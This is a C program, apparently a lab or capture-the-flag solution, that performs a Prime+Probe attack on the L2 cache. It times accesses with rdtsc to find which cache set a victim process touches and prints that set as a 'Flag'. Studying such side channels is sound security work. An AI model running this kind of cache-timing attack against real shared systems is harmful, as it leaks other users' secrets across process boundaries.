#include "util.h"
// mman library to be used for hugepage allocations (e.g. mmap or posix_memalign only)
#include <sys/mman.h>

#define L2_SIZE (1024 * 1024)
#define NUM_L2_CACHE_SETS 1024
#define L2_WAYS           16
#define CACHE_LINE        64
#define ACCESS_TIME_THRESHOLD 120 
#define BUFF_SIZE (L2_SIZE * (L2_WAYS + 2))
#define ROUNDS 500 

void prime_set(volatile char *buf, int set) {
    for (int repeat = 0; repeat < 3; repeat++)
        for (int way = 0; way < L2_WAYS; way++)
            buf[(set * CACHE_LINE) + (way * NUM_L2_CACHE_SETS * CACHE_LINE)] ^= 1;
}

uint64_t probe_set(volatile char *buf, int set) {
    uint64_t slow = 0;
    for (int way = L2_WAYS - 1; way >= 0; way--) {
        uint64_t t = measure_one_block_access_time(
            (ADDR_PTR)&buf[(set * CACHE_LINE) + (way * NUM_L2_CACHE_SETS * CACHE_LINE)]);
        if (t > ACCESS_TIME_THRESHOLD) slow++;
    }
    return slow;
}

static inline void wait_cycles(uint64_t cycles) {
    uint32_t lo, hi;
    asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
    uint64_t start = ((uint64_t)hi << 32) | lo;
    uint64_t end = start + cycles;
    do {
        asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
    } while ((((uint64_t)hi << 32) | lo) < end);
}

int main(int argc, char const *argv[]) {
    void *buf= mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);

    if (buf == (void*) - 1) {
       perror("mmap() error\n");
       exit(EXIT_FAILURE);
    }

    int freq[NUM_L2_CACHE_SETS] = {0};
    int best_set = 0;
    
    while (1) {
        for (int round = 0; round < ROUNDS; round++) { 
       	    for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
                prime_set((volatile char *)buf, set); 
                
	   	wait_cycles(5000);

	        uint64_t slow = probe_set((volatile char *)buf, set);	           
		if (slow >= 1) {
                    freq[set]++;
                    if (freq[set] > freq[best_set]) {
                        best_set = set;
                    }
	        }	
    	    }
	}
	
	int second_set = (best_set == 0) ? 1 : 0;
    	for (int s = 0; s < NUM_L2_CACHE_SETS; s++) {
            if (s != best_set && freq[s] > freq[second_set]) {
            	second_set = s;
	    }
    	}	
    	
	printf("Flag: %d (freq: %d) | 2nd: %d (freq: %d) | ratio: %.1fx\n",
        best_set, freq[best_set],
        second_set, freq[second_set],
        (float)freq[best_set] / (freq[second_set] + 1));
    	fflush(stdout);
    }
    return 0;
}

